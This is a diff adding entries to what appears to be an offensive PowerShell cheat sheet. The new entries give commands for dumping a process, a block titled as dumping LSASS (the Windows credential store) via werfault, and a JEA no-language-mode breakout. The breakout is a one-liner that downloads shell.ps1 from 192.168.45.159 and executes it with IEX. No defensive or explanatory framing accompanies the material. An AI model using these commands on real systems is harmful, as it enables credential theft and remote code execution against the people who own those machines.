@@ -91,3 +91,30 @@ $encodedScript
 ```
 
 
+## Dump a process
+
+```powershell
+# Get process by name or PID
+$process = Get-Process -Name "notepad"
+
+# Create a dump using task manager
+Start-Process taskmgr.exe /PID $process.Id /DumpFile C:\dumps\processdump.dmp
+
+```
+
+
+### Dumping LSASS using werfault
+
+```powershell
+$lsass = Get-Process -Name lsass
+$dumpPath = "C:\dumps\lsass.dmp"
+Start-Process -FilePath "werfault.exe" -ArgumentList "/dump $($lsass.Id) $dumpPath"
+```
+
+
+## No-Language Mode Breakout (JEA)
+
+```powershell
+&{IEX(New-Object Net.WebClient).downloadString('http://192.168.45.159:8000/ps/shell.ps1')}
+```
+
